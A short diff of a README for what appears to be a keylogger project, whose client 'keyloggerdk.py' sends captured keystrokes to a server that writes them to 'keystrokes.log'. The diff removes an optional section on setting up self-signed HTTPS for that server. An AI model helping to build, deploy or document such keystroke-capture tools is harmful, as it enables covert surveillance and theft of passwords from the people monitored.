@@ -79,22 +79,8 @@ Logs will appear in the server’s `keystrokes.log`.
 
 ---
 
-## 🔐 (Optional) Enable HTTPS
 
-### Step 1: Generate SSL Certificate (self-signed)
-```bash
-openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
-```
-
-### Step 2: Modify `store_keystrokes_server.py`
-
-Add to `run()`:
-```python
-import ssl
-httpd.socket = ssl.wrap_socket(httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True)
-```
-
-### Step 3: Update `keyloggerdk.py`
+### 3: Update `keyloggerdk.py`
 
 Change:
 ```python
